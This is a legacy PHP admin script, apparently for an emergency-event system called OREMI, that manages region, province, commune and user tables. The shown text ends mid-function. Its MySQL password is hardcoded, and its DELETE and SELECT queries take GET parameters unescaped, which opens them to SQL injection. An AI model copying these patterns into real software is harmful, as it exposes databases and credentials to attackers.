<?
function mensaje_error($error_accion_ms) {
 cabeceraHTML();
 cabeceraUsualHTML();
 cabeceraRegionHTML();
 echo "<tr><td ColSpan=2 height=25></td></tr>";
 echo "<tr><td ColSpan=2>";
 echo ('<table width="450" border="0" cellpadding="0" cellspacing="0">');
 echo "   <tr><td valign=middle class=topmenu><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>ERROR</td></tr>";
 echo "   <tr><td valign=middle background='../imagenes/linea.gif'></td></tr>";
 echo "   <tr><td height=15></td></tr>";
 echo "   <tr><td>";
 echo "$error_accion_ms</td></tr>";
 echo('   <tr><td height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a></tr>');
 echo "</table>";
 echo "</td></tr>";
 echo "</table>";
 echo "</td></tr>";
 echo "</table>";
 restoHTML();
}


function mensaje_aviso($aviso_accion_ms) {
 cabeceraHTML();
 cabeceraUsualHTML();
 cabeceraRegionHTML();
 echo "<tr><td ColSpan=2 height=25></td></tr>";
 echo "<tr><td ColSpan=2>";
 echo ('<table width="450" border="0" cellpadding="0" cellspacing="0">');
 echo "   <tr><td valign=middle class=topmenu><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>ATENCI&Oacute;N</td></tr>";
 echo "   <tr><td valign=middle background='../imagenes/linea.gif'></td></tr>";
 echo "   <tr><td height=15></td></tr>";
 echo "   <tr><td>";
 echo "$aviso_accion_ms</td></tr>";
 echo "</table>";
 echo "</td></tr>";
 echo "</table>";
 echo "</td></tr>";
 echo "</table>";
 restoHTML();

}

function cabeceraHTML() {
echo <<< HTML
<html>
<head>
<title>OREMI</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="stylesheet" href="../css/oremi.css" type="text/css">
<SCRIPT TYPE="text/javascript">
<!--
// copyright 1999 Idocs, Inc. http://www.idocs.com
// Distribute this script freely but keep this notice in place
function numbersonly(myfield, e, dec)
{
var key;
var keychar;

if (window.event)
   key = window.event.keyCode;
else if (e)
   key = e.which;
else
   return true;
keychar = String.fromCharCode(key);

// control keys
if ((key==null) || (key==0) || (key==8) ||
    (key==9) || (key==13) || (key==27) )
   return true;

// numbers
else if ((("0123456789").indexOf(keychar) > -1))
   return true;

// decimal point jump
else if (dec && (keychar == "."))
   {
   myfield.form.elements[dec].focus();
   return false;
   }
else
   return false;
}
function validarEmail(valor) {
  if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(valor)){
    return (true)
  } else {
    alert("La direcci�n de email es incorrecta.");
    return (false);
  }
}

function validaRegion()
{
  if(document.form.nroregion.value== "")
  {
    document.form.nroregion.focus();
    alert('Debe Ingresar El N�mero Correspondiente a la Regi�n .. !!!');
    return false;
  }
  if(document.form.nnombreregion.value== "")
  {
    document.form.nnombreregion.focus();
    alert('Debe Ingresar el Nombre de la Regi�n .. !!!');
    return false;
  }
  else
  {
    document.form.submit();
    return true;
  }
}
function validaProvincia()
{
  if(document.form.region.value== "--")
  {
    document.form.region.focus();
    alert('Debe Seleccionar una Regi�n .. !!!');
    return false;
  }
  if(document.form.nroprovincia.value== "" || document.form.nroprovincia.value=="0")
  {
    document.form.nroprovincia.focus();
    alert('Debe Ingresar El N�mero Correspondiente a la Provincia De Acuerdo a Orden de Precedendia en La Regi�n .. !!!');
    return false;
  }
  if(document.form.nombreprovincia.value== "")
  {
    document.form.nombreprovincia.focus();
    alert('Debe Ingresar el Nombre de la Provincia .. !!!');
    return false;
  }
  else
  {
    document.form.submit();
    return true;
  }
}
function validaComuna()
{
  if(document.form.regionprovincia.value== "--")
  {
    document.form.regionprovincia.focus();
    alert('Debe Seleccionar una Regi�n/Provincia .. !!!');
    return false;
  }
  if(document.form.nrocomuna.value== "" || document.form.nrocomuna.value=="0")
  {
    document.form.nrocomuna.focus();
    alert('Debe Ingresar El N�mero Correspondiente a la Comuna De Acuerdo a Orden de Precedencia en La Provincia .. !!!');
    return false;
  }
  if(document.form.nombrecomuna.value== "")
  {
    document.form.nombrecomuna.focus();
    alert('Debe Ingresar el Nombre de la Comuna .. !!!');
    return false;
  }
  else
  {
    document.form.submit();
    return true;
  }
}
function validaUbicacion()
{
  if(document.form.nroubicacion.value== "" || document.form.nroubicacion.value=="0")
  {
    document.form.nroubicacion.focus();
    alert('Debe Ingresar un Valor Num�rico Mayor que Cero (0) para Id. .. !!!');
    return false;
  }
  if(document.form.nombreubicacion.value== "")
  {
    document.form.nombreubicacion.focus();
    alert('Debe Seleccionar un Nombre para la Ubicacion .. !!!');
    return false;
  }
  else
  {
    document.form.submit();
    return true;
  }
}


function validaTipoEvento()
{
  if(document.form.nrotipoevento.value== "" || document.form.nrotipoevento.value=="0")
  {
    document.form.nrotipoevento.focus();
    alert('Debe Ingresar un Valor Num�rico Mayor que Cero (0) para Id. TipoEvento .. !!!');
    return false;
  }
  if(document.form.nombretipoevento.value== "")
  {
    document.form.nombretipoevento.focus();
    alert('Debe Seleccionar un Nombre para el Tipo de Evento .. !!!');
    return false;
  }

  else
  {
    document.form.submit();
    return true;
  }
}
function validaNivelRespuesta()
{
  if(document.form.nrocaprespuesta.value== "" || document.form.nrocaprespuesta.value=="0")
  {
    document.form.nrocaprespuesta.focus();
    alert('Debe Ingresar un Valor Num�rico Mayor que Cero (0) para Id. Nivel .. !!!');
    return false;
  }
  if(document.form.nombrenivel.value== "")
  {
    document.form.nombrenivel.focus();
    alert('Debe Seleccionar un Nombre para el Nivel de Respuesta .. !!!');
    return false;
  }

  else
  {
    document.form.submit();
    return true;
  }
}
function validaEstadoAlfa()
{
  if(document.form.nroestadoalfa.value== "" || document.form.nroestadoalfa.value=="0")
  {
    document.form.nroestadoalfa.focus();
    alert('Debe Ingresar un Valor Num�rico Mayor que Cero (0) para Id. Estado .. !!!');
    return false;
  }
  if(document.form.nombreestadoalfa.value== "")
  {
    document.form.nombreestadoalfa.focus();
    alert('Debe Seleccionar un Nombre para el Estado Alfa .. !!!');
    return false;
  }

  else
  {
    document.form.submit();
    return true;
  }
}

function validaEstadoEvento()
{
  if(document.form.nroestadoevento.value== "" || document.form.nroestadoevento.value=="0")
  {
    document.form.nroestadoevento.focus();
    alert('Debe Ingresar un Valor Num�rico Mayor que Cero (0) para Id. Estado .. !!!');
    return false;
  }
  if(document.form.nombreestadoevento.value== "")
  {
    document.form.nombreestadoevento.focus();
    alert('Debe Seleccionar un Nombre para el Estado Evento .. !!!');
    return false;
  }

  else
  {
    document.form.submit();
    return true;
  }
}

function validaTipoRecurso()
{
  if(document.form.nrotiporecurso.value== "" || document.form.nrotiporecurso.value=="0")
  {
    document.form.nrotiporecurso.focus();
    alert('Debe Ingresar un Valor Num�rico Mayor que Cero (0) para Id. Tipo .. !!!');
    return false;
  }
  if(document.form.nombrerecurso.value== "")
  {
    document.form.nombrerecurso.focus();
    alert('Debe Seleccionar un Nombre para el Recurso .. !!!');
    return false;
  }

  else
  {
    document.form.submit();
    return true;
  }
}

function SaltaSelect(targ,selObj,restore){ //v3.0
  eval(targ+".location='"+selObj.options[selObj.selectedIndex].value+"'");
  if (restore) selObj.selectedIndex=0;
}

function validaFuente()
{
  if(document.form.nombre.value== "")
  {
    document.form.nombre.focus();
    alert('Debe Seleccionar un Nombre .. !!!');
    return false;
  }

  if(document.form.uname.value== "")
  {
    document.form.uname.focus();
    alert('Debe Seleccionar un UserName para el Usuario .. !!!');
    return false;
  }

  if(document.form.passw.value== "")
  {
    document.form.passw.focus();
    alert('Debe Seleccionar una Password para el UserName .. !!!');
    return false;
  }

  if(document.form.nivel.value== "")
  {
    document.form.nivel.focus();
    alert('Debe Seleccionar un Nivel .. !!!');
    return false;
  }

  if(document.form.cargo.value== "")
  {
    document.form.cargo.focus();
    alert('Debe Seleccionar un Cargo .. !!!');
    return false;
  }

  else
  {
    document.form.submit();
    return true;
  }
}
function validaModFuente()
{
  if(document.form.nombre.value== "")
  {
    document.form.nombre.focus();
    alert('Debe Seleccionar un Nombre .. !!!');
    return false;
  }

  if(document.form.nivel.value== "")
  {
    document.form.nivel.focus();
    alert('Debe Seleccionar un Nivel .. !!!');
    return false;
  }

  if(document.form.cargo.value== "")
  {
    document.form.cargo.focus();
    alert('Debe Seleccionar un Cargo .. !!!');
    return false;
  }

  else
  {
    document.form.submit();
    return true;
  }
}
//-->
</SCRIPT>
</head>
<body bgcolor="#FFFFFF" text="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
HTML;
}


function centroHTML() {
echo <<< HTML
<!-- De Acuerdo A Tabla Escogida -->
    <td width="450" height="355" valign="top">
        <!-- Secci�n Central - Carga de Actualizaciones -->
      <table width="450" border="0" cellpadding="0" cellspacing="0">
        <tr>
          <td width="450" height="355"></td>
        </tr>
      </table>
          <!-- FIN Secci�n Central - Carga de Actualizaciones -->
<!-- De Acuerdo A Tabla Escogida -->
HTML;
}


function restoHTML() {
echo <<< HTML
    </td>
    <td width="120" valign="top" rowspan="2">
        <!-- Secci�n Lateral Derecha  -->
      <table width="120" border="0" cellpadding="0" cellspacing="0">
        <tr>
          <td width="120" height="330"></td>
        </tr>
        <tr>
          <td valign="top" height="60">
            <table width="100%" border="0" cellpadding="0" cellspacing="0">
              <tr>
                <td width="120" height="60" valign="top">&nbsp;</td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
          <!-- FIN Secci�n Lateral Derecha -->
    </td>
  </tr>
  <tr>
    <td height="25" valign="top">
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
        <tr>
          <td width="450" height="25"></td>
        </tr>
      </table>
    </td>
  </tr>
</table>
</center>
</body>
</html>
HTML;
}

function cabeceraRegionHTML() {
echo <<< HTML
    <td width="450" height="355" valign="top">
    <!-- Secci�n Central - Carga de Actualizaciones -->
    <table width="450" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td>
          <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
            <tr>
              <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/linsup.gif"></td>
            </tr>
            <tr height="25">
             <td class="topmenu" valign="middle">&nbsp;TABLA:&nbsp;&nbsp;&nbsp;R&nbsp; E&nbsp; G&nbsp; I&nbsp; O&nbsp; N&nbsp; E&nbsp; S&nbsp;&nbsp;&nbsp;</td>
              <td align="right" valign="middle">:: <a href="$PHP_SELF?accion=agregar_region">Agregar</a></td>
			  
            </tr>
            <tr>
             <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/lininf.gif"></td>
            </tr>
HTML;
}

function cabeceraProvinciaHTML() {
echo <<< HTML
    <td width="450" height="355" valign="top">
    <!-- Secci�n Central - Carga de Actualizaciones -->
    <table width="450" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td>
          <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
            <tr>
              <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/linsup.gif"></td>
            </tr>
            <tr height="25">
             <td class="topmenu" valign="middle">&nbsp;TABLA:&nbsp;&nbsp;&nbsp;P&nbsp; R&nbsp; O&nbsp; V&nbsp; I&nbsp; N&nbsp; C&nbsp; I&nbsp; A&nbsp;&nbsp;</td>
              <td align="right" valign="middle">:: <a href="$PHP_SELF?accion=agregar_provincia">Agregar</a></td>
            </tr>
            <tr>
             <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/lininf.gif"></td>
            </tr>
HTML;
}

function cabeceraComunaHTML() {
echo <<< HTML
    <td width="450" height="355" valign="top">
    <!-- Secci�n Central - Carga de Actualizaciones -->
    <table width="450" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td>
          <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
            <tr>
              <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/linsup.gif"></td>
            </tr>
            <tr height="25">
             <td class="topmenu" valign="middle">&nbsp;TABLA:&nbsp;&nbsp;&nbsp;C&nbsp; O&nbsp; M&nbsp; U&nbsp; N&nbsp; A&nbsp;&nbsp;&nbsp;</td>
              <td align="right" valign="middle">:: <a href="$PHP_SELF?accion=agregar_comuna">Agregar</a></td>
            </tr>
            <tr>
             <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/lininf.gif"></td>
            </tr>
HTML;
}

function cabeceraUbicacionHTML() {
echo <<< HTML
    <td width="450" height="355" valign="top">
    <!-- Secci�n Central - Carga de Actualizaciones -->
    <table width="450" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td>
          <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
            <tr>
              <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/linsup.gif"></td>
            </tr>
            <tr height="25">
             <td class="topmenu" valign="middle">&nbsp;TABLA:&nbsp;&nbsp;&nbsp;U&nbsp; B&nbsp; I&nbsp; C&nbsp; A&nbsp; C&nbsp; I&nbsp; &Oacute;&nbsp; N&nbsp;&nbsp;</td>
              <td align="right" valign="middle">:: <a href="$PHP_SELF?accion=agregar_ubicacion">Agregar</a></td>
            </tr>
            <tr>
             <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/lininf.gif"></td>
            </tr>
HTML;
}


function cabeceraTipoEventoHTML() {
echo <<< HTML
    <td width="450" height="355" valign="top">
    <!-- Secci�n Central - Carga de Actualizaciones -->
    <table width="450" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td>
          <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
            <tr>
              <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/linsup.gif"></td>
            </tr>
            <tr height="25">
             <td class="topmenu" valign="middle">&nbsp;TABLA:&nbsp;&nbsp;&nbsp;T&nbsp; I&nbsp; P&nbsp; O&nbsp; E&nbsp; V&nbsp; E&nbsp; N&nbsp; T&nbsp; O&nbsp;</td>
              <td align="right" valign="middle">:: <a href="$PHP_SELF?accion=agregar_tipoevento">Agregar</a></td>
            </tr>
            <tr>
             <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/lininf.gif"></td>
            </tr>
HTML;
}

function cabeceraNivelRespuestaHTML() {
echo <<< HTML
    <td width="450" height="355" valign="top">
    <!-- Secci�n Central - Carga de Actualizaciones -->
    <table width="450" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td>
          <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
            <tr>
              <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/linsup.gif"></td>
            </tr>
            <tr height="25">
             <td class="topmenu" valign="middle">&nbsp;TABLA:&nbsp;&nbsp;&nbsp;N&nbsp; I&nbsp; V&nbsp; E&nbsp; L&nbsp;&nbsp;&nbsp;  D&nbsp;  E&nbsp;&nbsp;&nbsp; R&nbsp; E&nbsp; S&nbsp; P&nbsp; U&nbsp; E&nbsp; S&nbsp; T&nbsp; A&nbsp;</td>
              <td align="right" valign="middle">:: <a href="$PHP_SELF?accion=agregar_nivelrespuesta">Agregar</a></td>
            </tr>
            <tr>
             <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/lininf.gif"></td>
            </tr>
HTML;
}

function cabeceraEstadoAlfaHTML() {
echo <<< HTML
    <td width="450" height="355" valign="top">
    <!-- Secci�n Central - Carga de Actualizaciones -->
    <table width="450" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td>
          <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
            <tr>
              <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/linsup.gif"></td>
            </tr>
            <tr height="25">
             <td class="topmenu" valign="middle">&nbsp;TABLA:&nbsp;&nbsp;&nbsp;E&nbsp; S&nbsp; T&nbsp; A&nbsp; D&nbsp; O&nbsp;&nbsp;&nbsp;&nbsp;  A&nbsp;  L&nbsp; F&nbsp; A&nbsp;&nbsp;</td>
              <td align="right" valign="middle">:: <a href="$PHP_SELF?accion=agregar_estadoalfa">Agregar</a></td>
            </tr>
            <tr>
             <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/lininf.gif"></td>
            </tr>
HTML;
}


function cabeceraEstadoEventoHTML() {
echo <<< HTML
    <td width="450" height="355" valign="top">
    <!-- Secci�n Central - Carga de Actualizaciones -->
    <table width="450" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td>
          <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
            <tr>
              <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/linsup.gif"></td>
            </tr>
            <tr height="25">
             <td class="topmenu" valign="middle">&nbsp;TABLA:&nbsp;&nbsp;&nbsp;E&nbsp; S&nbsp; T&nbsp; A&nbsp; D&nbsp; O&nbsp;&nbsp;&nbsp;&nbsp;  E&nbsp;  V&nbsp; E&nbsp; N&nbsp; T&nbsp; O&nbsp;</td>
              <td align="right" valign="middle">:: <a href="$PHP_SELF?accion=agregar_estadoevento">Agregar</a></td>
            </tr>
            <tr>
             <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/lininf.gif"></td>
            </tr>
HTML;
}


function cabeceraTipoRecursoHTML() {
echo <<< HTML
    <td width="450" height="355" valign="top">
    <!-- Secci�n Central - Carga de Actualizaciones -->
    <table width="450" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td>
          <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
            <tr>
              <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/linsup.gif"></td>
            </tr>
            <tr height="25">
             <td class="topmenu" valign="middle">&nbsp;TABLA:&nbsp;&nbsp;&nbsp;T&nbsp; I&nbsp; P&nbsp; O&nbsp; &nbsp;&nbsp;&nbsp;  R&nbsp;  E&nbsp; C&nbsp; U&nbsp; R&nbsp; S&nbsp; O&nbsp;</td>
              <td align="right" valign="middle">:: <a href="$PHP_SELF?accion=agregar_tiporecurso">Agregar</a></td>
            </tr>
            <tr>
             <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/lininf.gif"></td>
            </tr>
HTML;
}


function cabeceraAlertaHTML() {
echo <<< HTML
    <td width="450" height="355" valign="top">
    <!-- Secci�n Central - Carga de Actualizaciones -->
    <table width="450" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td>
          <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
            <tr>
              <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/linsup.gif"></td>
            </tr>
            <tr height="25">
             <td class="topmenu" valign="middle">&nbsp;TABLA:&nbsp;&nbsp;&nbsp;A&nbsp; L&nbsp; E&nbsp; R&nbsp; T&nbsp; A&nbsp;&nbsp;&nbsp;</td>
              <td align="right" valign="middle">:: <a href="$PHP_SELF?accion=agregar_alerta">Agregar</a></td>
            </tr>
            <tr>
             <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/lininf.gif"></td>
            </tr>
HTML;
}



function cabeceraFuenteHTML() {
echo <<< HTML
    <td width="450" height="355" valign="top">
    <!-- Secci�n Central - Carga de Actualizaciones -->
    <table width="450" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td>
          <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">
            <tr>
              <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/linsup.gif"></td>
            </tr>
            <tr height="25">
             <td class="topmenu" valign="middle">&nbsp;TABLA:&nbsp;&nbsp;&nbsp;F&nbsp; U&nbsp; E&nbsp; N&nbsp; T&nbsp; E&nbsp;&nbsp;&nbsp;</td>
              <td align="right" valign="middle">:: <a href="$PHP_SELF?accion=agregar_fuente">Agregar</a></td>
            </tr>
            <tr>
             <td width="450" height="5" ColSpan="2" valign="top" background="../imagenes/lininf.gif"></td>
            </tr>
HTML;
}



$myconn = @mysql_connect("localhost","cqbogore","bellsouth");
if(!$myconn) { echo ('Imposible conectarse con MYSQL.'); exit();}
if(!@mysql_select_db("oremi")) { echo ('Imposible conectarse con la BD.'); exit();}

global $IdRegion, $NoRegion;
require("utiles/util.inc");

function cabeceraUsualHTML() {
echo <<< HTML
<center>
<table width="720" border="0" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="145" height="75" valign="top" bgcolor="#dde5f2">&nbsp;</td>
    <td width="450" valign="top"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=5,0,0,0" width="450" height="75">
        <param name=movie value="../swf/oremi.swf">
        <param name=quality value=high>
        <embed src="../swf/oremi.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="450" height="75">
        </embed> 
      </object></td>
    <td width="125" valign="top"> 
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
        <tr> 
          <td width="25" valign="top" rowspan="5" bgcolor="#dde5f2">&nbsp;</td>
          <td width="100" valign="top" height="15">&nbsp;</td>
        </tr>
        <tr> 
          <td valign="top" height="15">&nbsp;</td>
        </tr>
        <tr> 
          <td valign="top" height="15">&nbsp;</td>
        </tr>
        <tr> 
          <td valign="top" height="15">&nbsp;</td>
        </tr>
        <tr> 
          <td valign="top" height="15">&nbsp;</td>
        </tr>
      </table>
    </td>
  </tr>
</table>
<table width="720" border="0" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="720" height="25"></td>
  </tr>
</table>
<table width="720" border="0" cellpadding="0" cellspacing="0" >
  <tr> 
    <td width="150" valign="top" rowspan="2"> 
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
        <tr> 
          <td width="14" height="73"></td>
          <td valign="top"> 
            <table width="100%" border="0" cellpadding="1" cellspacing="1" class="tableborder">
              <tr> 
                <td width="118" height="20" valign="top" bgcolor="#DDE5F2" class="topmenu"> 
                  <div align="center">Tabla Pa&iacute;s </div>
                </td>
              </tr>
              <tr> 
                <td valign="top" height="16" bgcolor="#FFFFFF" class="bluenone"><a href="$PHP_SELF?accion=region">Regi&oacute;n</a></td>
              </tr>
              <tr> 
                <td height="16" valign="top" bgcolor="#FFFFFF"><a href="$PHP_SELF?accion=provincia">Provincia</a></td>
              </tr>
              <tr> 
                <td height="16" valign="top" bgcolor="#FFFFFF"><a href="$PHP_SELF?accion=comuna">Comuna</a></td>
              </tr>
            </table>
          </td>
          <td width="14"></td>
        </tr>
        <tr> 
          <td colspan="2" height="5" valign="top"></td>
          <td valign="top"></td>
        </tr>
        <tr> 
          <td height="39"></td>
          <td valign="top"> 
            <table width="100%" border="0" cellpadding="1" cellspacing="1" class="tableborder">
              <tr> 
                <td width="118" height="20" valign="top" class="topmenu"> 
                  <div align="center">Tabla Ubicaci&oacute;n </div>
                </td>
              </tr>
              <tr> 
                <td valign="top" height="16" bgcolor="#FFFFFF"><a href="$PHP_SELF?accion=ubicacion">Ubicaci&oacute;n</a></td>
              </tr>
            </table>
          </td>
          <td></td>
        </tr>
        <tr> 
          <td colspan="2" height="5" valign="top"></td>
          <td valign="top"></td>
        </tr>
        <tr> 
          <td height="39"></td>
          <td valign="top"> 
            <table width="100%" border="0" cellpadding="1" cellspacing="1" class="tableborder">
              <tr> 
                <td width="118" height="20" valign="top" class="topmenu"> 
                  <div align="center">Tabla Tipo Evento</div>
                </td>
              </tr>
              <tr> 
                <td valign="top" height="16" bgcolor="#FFFFFF"><a href="$PHP_SELF?accion=tipoevento">Tipo Evento</a></td>
              </tr>
            </table>
          </td>
          <td></td>
        </tr>
        <tr> 
          <td colspan="2" height="5" valign="top"></td>
          <td valign="top"></td>
        </tr>
		<tr> 
          <td height="39"></td>
          <td valign="top"> 
            <table width="100%" border="0" cellpadding="1" cellspacing="1" class="tableborder">
              <tr> 
                <td width="118" height="20" valign="top" class="topmenu"> 
                  <div align="center">Tabla Cap. Respuesta</div>
                </td>
              </tr>
              <tr> 
                <td valign="top" height="16" bgcolor="#FFFFFF"><a href="$PHP_SELF?accion=nivelrespuesta">Nivel Respuesta</a></td>
              </tr>
            </table>
          </td>
          <td></td>
        </tr>
        <tr> 
          <td colspan="2" height="5" valign="top"></td>
          <td valign="top"></td>
        </tr>
	<tr> 
          <td height="39"></td>
          <td valign="top"> 
            <table width="100%" border="0" cellpadding="1" cellspacing="1" class="tableborder">
              <tr> 
                <td width="118" height="20" valign="top" class="topmenu"> 
                  <div align="center">Tabla Estado Alfa</div>
                </td>
              </tr>
              <tr> 
                <td valign="top" height="16" bgcolor="#FFFFFF"><a href="$PHP_SELF?accion=estadoalfa">Estado Alfa</a></td>
              </tr>
            </table>
          </td>
          <td></td>
        </tr>
        <tr> 
          <td colspan="2" height="5" valign="top"></td>
          <td valign="top"></td>
        </tr>
	<tr> 
          <td height="39"></td>
          <td valign="top"> 
            <table width="100%" border="0" cellpadding="1" cellspacing="1" class="tableborder">
              <tr> 
                <td width="118" height="20" valign="top" class="topmenu"> 
                  <div align="center">Tabla Estado Evento</div>
                </td>
              </tr>
              <tr> 
                <td valign="top" height="16" bgcolor="#FFFFFF"><a href="$PHP_SELF?accion=estadoevento">Estado Evento</a></td>
              </tr>
            </table>
          </td>
          <td></td>
        </tr>
        <tr> 
          <td colspan="2" height="5" valign="top"></td>
          <td valign="top"></td>
        </tr>
		<tr> 
          <td height="39"></td>
          <td valign="top"> 
            <table width="100%" border="0" cellpadding="1" cellspacing="1" class="tableborder">
              <tr> 
                <td width="118" height="20" valign="top" class="topmenu"> 
                  <div align="center">Tabla Tipo Recurso</div>
                </td>
              </tr>
              <tr> 
                <td valign="top" height="16" bgcolor="#FFFFFF"><a href="$PHP_SELF?accion=tiporecurso">Tipo Recurso</a></td>
              </tr>
            </table>
          </td>
          <td></td>
        </tr>
        <tr> 
          <td colspan="2" height="5" valign="top"></td>
          <td valign="top"></td>
        </tr>
		<tr> 
          <td height="39"></td>
          <td valign="top"> 
            <table width="100%" border="0" cellpadding="1" cellspacing="1" class="tableborder">
              <tr> 
                <td width="118" height="20" valign="top" class="topmenu"> 
                  <div align="center">Tabla Alerta</div>
                </td>
              </tr>
              <tr> 
                <td valign="top" height="16" bgcolor="#FFFFFF"><a href="$PHP_SELF?accion=alerta">Alerta Vigente</a></td>
              </tr>
            </table>
          </td>
          <td></td>
        </tr>
        <tr> 
          <td colspan="2" height="5" valign="top"></td>
          <td valign="top"></td>
        </tr>
		<tr> 
          <td height="39"></td>
          <td valign="top"> 
            <table width="100%" border="0" cellpadding="1" cellspacing="1" class="tableborder">
              <tr> 
                <td width="118" height="20" valign="top" class="topmenu"> 
                  <div align="center">Tabla Fuente</div>
                </td>
              </tr>
              <tr> 
                <td valign="top" height="16" bgcolor="#FFFFFF"><a href="$PHP_SELF?accion=fuente">Fuente</a></td>
              </tr>
            </table>
          </td>
          <td></td>
        </tr>

        <tr> 
          <td colspan="2" height="5" valign="top"></td>
          <td valign="top"></td>
        </tr>
      </table>
    </td>
HTML;
}

if (!isset($HTTP_GET_VARS['accion'])){
  cabeceraHTML();
  cabeceraUsualHTML();
  centroHTML();
  restoHTML();
}

if (isset($HTTP_GET_VARS['id'])) {
   // Borra Region
   if ($HTTP_GET_VARS['accion']=="borra_region"){
     $id_borrar= $HTTP_GET_VARS['id'];
     $con_provin = mysql_query("SELECT * FROM Provincia WHERE idreg=$id") or Die("Imposible Realizar Consulta a Tabla Provincia .. Ha ocurrido un Error Inesparado .. !!! ");
     $NumReg = mysql_num_rows($con_provin);
     mysql_free_result($con_provin);  
     if ($NumReg == 0) {
        mysql_query("DELETE FROM Region WHERE idreg=$id_borrar") or die("Imposible Eliminar Regi�n .. !!!");
        mysql_close();
        header ("Location: $PHP_SELF?accion=region");
        exit;
     } else {
       // Existe Informacion Relacionada a la Regi�n en Tabla Provincia
       $error_accion_ms = "Imposible Borrar Registro .. Existe Informacion Relacionada a la Regi�n en Tabla Provincia ..!!!";
       mensaje_error($error_accion_ms);
     }
  }
  // Borra Provincia
   if ($HTTP_GET_VARS['accion']=="borra_provincia"){
        $id_r= $HTTP_GET_VARS['id'];
        $id_p= $HTTP_GET_VARS['id_p'];

        $con_comuna = mysql_query("SELECT * FROM Comuna WHERE idpro=$id_p") or Die("Imposible Realizar Consulta a Tabla Comuna .. Ha ocurrido un Error Inesparado .. !!! ");

       $NumReg = mysql_num_rows($con_comuna);
       mysql_free_result($con_comuna);
       if ($NumReg == 0) {
         mysql_query("DELETE FROM Provincia WHERE idreg='$id_r' AND idpro='$id_p'") or die("Imposible Eliminar Provincia .. !!!");
        mysql_close();
        header ("Location: $PHP_SELF?accion=provincia");
        exit;
      } else {
       // Existe Informacion Relacionada a la Provincia en Tabla Comuna
       $error_accion_ms = "Imposible Borrar Registro .. Existe Informacion Relacionada a la Provincia en Tabla Comuna ..!!!";
       mensaje_error($error_accion_ms);
     }

  }

// Borra Comuna
if ($HTTP_GET_VARS['accion']=="borra_comuna"){
        $id_p= $HTTP_GET_VARS['id'];
        $id_c= $HTTP_GET_VARS['id_c'];

        mysql_query("DELETE FROM Comuna WHERE idpro='$id_p' AND idcom='$id_c'") or die("Imposible Eliminar Comuna .. !!!");
        mysql_close();
        header ("Location: $PHP_SELF?accion=comuna");
        exit;
}

// Borra Ubicacion
if ($HTTP_GET_VARS['accion']=="borra_ubicacion"){
        $id= $HTTP_GET_VARS['id'];

        $con_ubicacion = mysql_query("SELECT idubicacion FROM Evento WHERE idubicacion=$id") or Die("Imposible Realizar Consulta a Tabla TipoEvento .. Ha ocurrido un Error Inesparado .. !!! ");

       $NumReg = mysql_num_rows($con_ubicacion);
       mysql_free_result($con_ubicacion);
